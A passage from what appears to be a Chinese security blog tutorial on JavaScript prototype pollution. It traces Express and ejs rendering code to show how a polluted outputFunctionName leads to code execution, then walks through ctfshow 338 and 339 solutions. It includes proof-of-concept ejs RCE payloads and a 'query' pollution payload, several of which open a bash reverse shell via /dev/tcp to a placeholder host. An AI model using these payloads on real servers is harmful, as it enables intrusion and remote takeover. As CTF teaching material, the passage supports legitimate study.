+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render(&quot;index.ejs&quot;, &#123;</span><br><span class="line">        message: &#x27;sp4c1ous&#x27;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>从这里继续分析：</p>
+<p>跟进这个render方法：</p>
+<ul>
+<li><p>node_modules&#x2F;express&#x2F;lib&#x2F;response.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render = function render(view, options, callback) &#123;</span><br><span class="line">  var app = this.req.app;</span><br><span class="line">  var done = callback;</span><br><span class="line">  var opts = options || &#123;&#125;;</span><br><span class="line">  var req = this.req;</span><br><span class="line">  var self = this;</span><br><span class="line"></span><br><span class="line">  // support callback function as second arg</span><br><span class="line">  if (typeof options === &#x27;function&#x27;) &#123;</span><br><span class="line">    done = options;</span><br><span class="line">    opts = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge res.locals</span><br><span class="line">  opts._locals = self.locals;</span><br><span class="line"></span><br><span class="line">  // default callback to respond</span><br><span class="line">  done = done || function (err, str) &#123;</span><br><span class="line">    if (err) return req.next(err);</span><br><span class="line">    self.send(str);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  // render</span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>​       1.<code>var app = this.req.app;</code> 用于获取当前请求的 Express 应用程序实例。<br>2. <code>var done = callback;</code> 将 <code>callback</code> 赋值给变量 <code>done</code>，用于处理渲染完成后的回调函数。<br>3. <code>var opts = options || &#123;&#125;;</code> 将 <code>options</code> 赋值给变量 <code>opts</code>，如果 <code>options</code> 未定义，则使用空对象。<br>4. <code>var req = this.req;</code> 获取当前请求的 <code>req</code> 对象。<br>5. <code>var self = this;</code> 将当前的 <code>res</code> 对象赋值给变量 <code>self</code>，用于在回调函数中引用。<br>6. 检查第二个参数 <code>options</code> 的类型。如果是函数类型，那么将其作为回调函数，<code>done</code> 将被重置为该函数，同时将 <code>opts</code> 重置为空对象。<br>7. <code>opts._locals = self.locals;</code> 合并当前 <code>res</code> 对象的 <code>locals</code> 属性到 <code>opts</code> 对象中。<br>8. 默认的回调函数 <code>done</code> 用于处理渲染完成后的操作。如果发生错误，将通过 <code>req.next(err)</code> 处理错误，否则将使用 <code>self.send(str)</code> 将渲染结果发送给客户端。<br>9. 最后，通过调用 <code>app.render(view, opts, done)</code> 来执行实际的渲染操作，使用应用程序实例的 <code>render</code> 方法来渲染视图模板。</p>
+<p>这段代码为 Express 应用程序的响应对象 <code>res</code> 添加了 <code>render</code> 方法，以便在路由处理程序中方便地渲染视图模板并发送给客户端</p>
+<p>跟进app.render方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.render = function render(name, options, callback) &#123;</span><br><span class="line">  var cache = this.cache;</span><br><span class="line">  var done = callback;</span><br><span class="line">  var engines = this.engines;</span><br><span class="line">  var opts = options;</span><br><span class="line">  var renderOptions = &#123;&#125;;</span><br><span class="line">  var view;</span><br><span class="line"></span><br><span class="line">  // support callback function as second arg</span><br><span class="line">  if (typeof options === &#x27;function&#x27;) &#123;</span><br><span class="line">    done = options;</span><br><span class="line">    opts = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge app.locals</span><br><span class="line">  merge(renderOptions, this.locals);</span><br><span class="line"></span><br><span class="line">  // merge options._locals</span><br><span class="line">  if (opts._locals) &#123;</span><br><span class="line">    merge(renderOptions, opts._locals);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // merge options</span><br><span class="line">  merge(renderOptions, opts);</span><br><span class="line"></span><br><span class="line">  // set .cache unless explicitly provided</span><br><span class="line">  if (renderOptions.cache == null) &#123;</span><br><span class="line">    renderOptions.cache = this.enabled(&#x27;view cache&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // primed cache</span><br><span class="line">  if (renderOptions.cache) &#123;</span><br><span class="line">    view = cache[name];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // view</span><br><span class="line">  if (!view) &#123;</span><br><span class="line">    var View = this.get(&#x27;view&#x27;);</span><br><span class="line"></span><br><span class="line">    view = new View(name, &#123;</span><br><span class="line">      defaultEngine: this.get(&#x27;view engine&#x27;),</span><br><span class="line">      root: this.get(&#x27;views&#x27;),</span><br><span class="line">      engines: engines</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    if (!view.path) &#123;</span><br><span class="line">      var dirs = Array.isArray(view.root) &amp;&amp; view.root.length &gt; 1</span><br><span class="line">        ? &#x27;directories &quot;&#x27; + view.root.slice(0, -1).join(&#x27;&quot;, &quot;&#x27;) + &#x27;&quot; or &quot;&#x27; + view.root[view.root.length - 1] + &#x27;&quot;&#x27;</span><br><span class="line">        : &#x27;directory &quot;&#x27; + view.root + &#x27;&quot;&#x27;</span><br><span class="line">      var err = new Error(&#x27;Failed to lookup view &quot;&#x27; + name + &#x27;&quot; in views &#x27; + dirs);</span><br><span class="line">      err.view = view;</span><br><span class="line">      return done(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // prime the cache</span><br><span class="line">    if (renderOptions.cache) &#123;</span><br><span class="line">      cache[name] = view;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // render</span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710154103094.png"
+                      alt="image-20230710154103094"
+                ></p>
+<p>进入app.render，发现最终会进入到tryRender:</p>
+<p>继续跟进：</p>
+<ul>
+<li>node_modules&#x2F;express&#x2F;lib&#x2F;application.js</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710154244173.png"
+                      alt="image-20230710154244173"
+                ></p>
+<p>该函数接受三个参数：</p>
+<ul>
+<li><code>view</code>：表示要渲染的视图对象。</li>
+<li><code>options</code>：可选的选项参数，用于向视图传递数据。</li>
+<li><code>callback</code>：回调函数，用于处理渲染结果或错误。</li>
+</ul>
+<p>函数的实现如下：</p>
+<ol>
+<li>在 <code>try</code> 代码块中，调用 <code>view.render(options, callback)</code> 来尝试渲染视图。这会将选项参数和回调函数传递给视图对象进行渲染。</li>
+<li>如果渲染过程中没有抛出错误，执行正常的渲染操作，并将结果通过回调函数传递出去。</li>
+<li>如果在 <code>try</code> 代码块中抛出了错误（比如视图渲染函数内部抛出异常），则 <code>catch</code> 代码块会捕获到该错误。</li>
+<li>在 <code>catch</code> 代码块中，调用 <code>callback(err)</code>，将捕获到的错误作为参数传递给回调函数进行处理。</li>
+</ol>
+<p>这里继续跟进view.render方法：</p>
+<ul>
+<li><p>node_modules&#x2F;express&#x2F;lib&#x2F;view.js</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710155808784.png"
+                      alt="image-20230710155808784"
+                ></p>
+</li>
+</ul>
+<p>​	到这里调用了engine，从这里进入到了模板引擎ejs.js中</p>
+<p>这里继续跟进ejs.js的renderFile方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710160156305.png"
+                      alt="image-20230710160156305"
+                ></p>
+<p>我们可以在最好发现又调用了tryHandleCache方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710160230167.png"
+                      alt="image-20230710160230167"
+                ></p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710160310520.png"
+                      alt="image-20230710160310520"
+                ></p>
+<p>进入到 handleCache 方法，跟进 handleCache：</p>
+<ul>
+<li>node_modules&#x2F;ejs&#x2F;ejs.js</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710160345175.png"
+                      alt="image-20230710160345175"
+                ></p>
+<p>我们在hadleCache中找到了渲染模板的compile方法</p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710160744167.png"
+                      alt="image-20230710160744167"
+                ></p>
+<p>在这里我们找到了outputFunctionName</p>
+<p>而且在这里我们可以看到又大量拼接</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!this.source) &#123;</span><br><span class="line">     this.generateSource();</span><br><span class="line">     prepended += &#x27;  var __output = [], __append = __output.push.bind(__output);&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     if (opts.outputFunctionName) &#123;</span><br><span class="line">       prepended += &#x27;  var &#x27; + opts.outputFunctionName + &#x27; = __append;&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>有代码我们可以看到这里opts.outputFunctionName被拼接到prepended中</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line">     appended += &#x27;  return __output.join(&quot;&quot;);&#x27; + &#x27;\n&#x27;;</span><br><span class="line">     this.source = prepended + this.source + appended;</span><br></pre></td></tr></table></figure></div>
+
+<p>而拼接完的prepended最好被传入到this.source中</p>
+<p>并被带入函数执行，所以如果我们能够污染 <code>opts.outputFunctionName</code>，就能将我们构造的 payload 拼接进 js 语句中，并在 ejs 渲染时进行 RCE。在 ejs 中还有一个 <code>render</code> 方法，其最终也是进入了compile</p>
+<p>ejs 模板引擎 RCE 常用的 POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="7、例题"><a href="#7、例题" class="headerlink" title="7、例题"></a>7、例题</h4><h5 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h5><p>login.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到当secret.ctfshow&#x3D;&#x3D;&#x3D;’36dboy’时会输出flag</p>
+<p>那么这里就是很明显的原型链污染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">utils.copy(user,req.body);</span><br></pre></td></tr></table></figure></div>
+
+<p>然后copy是在common.js中定义的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  copy:copy</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function copy(object1, object2)&#123;</span><br><span class="line">    for (let key in object2) &#123;</span><br><span class="line">        if (key in object2 &amp;&amp; key in object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>看到这个代码就很熟悉了，这就是上面我们分析的merge函数进行原型链污染</p>
+<p>这个copy函数和merge的功能是相同的</p>
+<p>直接把上面我们分析的paylaod改改直接就可以打：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;ctfshow&quot;:&quot; 36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707205610256.png"
+                      alt="image-20230707205610256"
+                ></p>
+<p>直接拿上面的payload改改参数就行</p>
+<p>或：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230707205621032.png"
+                      alt="image-20230707205621032"
+                ></p>
+<p>具体怎么实现的，就不再分析了，本质和上面我们分析的merge函数一个道理。</p>
+<h5 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h5><p>和上面几乎差不多</p>
+<p>但是获取flag的条件变了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line">function User()&#123;</span><br><span class="line">  this.username=&#x27;&#x27;;</span><br><span class="line">  this.password=&#x27;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">function normalUser()&#123;</span><br><span class="line">  this.user</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  var flag=&#x27;flag_here&#x27;;</span><br><span class="line">  var secert = &#123;&#125;;</span><br><span class="line">  var sess = req.session;</span><br><span class="line">  let user = &#123;&#125;;</span><br><span class="line">  utils.copy(user,req.body);</span><br><span class="line">  if(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>而且多了一个api.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">var utils = require(&#x27;../utils/common&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* GET home page.  */</span><br><span class="line">router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;</span><br><span class="line">  res.type(&#x27;html&#x27;);</span><br><span class="line">  res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>由login.js我们可以看到</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">secert.ctfshow===flag</span><br></pre></td></tr></table></figure></div>
+
+<p>但是这明显时不可能的，那我们就要换一个思路了</p>
+<p>看api.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p><code>res.render</code> 是一个常见的函数调用，用于渲染视图并将其发送给客户端。<code>&#39;api&#39;</code> 是要渲染的视图模板的名称，而 <code>&#123; query: Function(query)(query) &#125;</code> 是要传递给视图模板的数据对象。Function(query)创建一个新的函数，并使用传递的字符串 <code>query</code> 作为函数体。然后，该新函数立即被调用，传递了 <code>query</code> 作为参数。函数的返回值将作为 <code>&#123; query: ... &#125;</code> 数据对象中 <code>query</code> 属性的值。</p>
+<p>这里的参数名和函数体的字符串内容是一致的，因此实际上相当于是将query字符串解析成了一个函数并立即执行这个函数，返回值作为整个语句的结果。那我们去覆盖query进行命令执行，而且res.render在渲染视图模板的时候，会生成一个响应里面有参数传给客户端，然后我们这里第二参数是query，那么他就会自动去Object寻找值并返回。所以我们只要让Object.prototype下面的query的值为我们想要执行命令就可以了，这里我们可以通过login.js中的copy方法来执行。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">global.process 是 Node.js 中的全局对象 process。</span><br><span class="line">mainModule 是 process 对象的一个属性，它表示主模块，即应用程序的入口文件。</span><br><span class="line">constructor 是主模块的构造函数。</span><br><span class="line">_load(&#x27;child_process&#x27;) 是调用主模块构造函数的 _load 方法，并传递 &#x27;child_process&#x27; 作为参数。child_process 是 Node.js 内置模块，用于创建和管理子进程。</span><br><span class="line">.exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1\&#x27;) 是调用 child_process 模块的 exec</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <tags>
+        <tag>js</tag>
+      </tags>
+  </entry>
 </search>
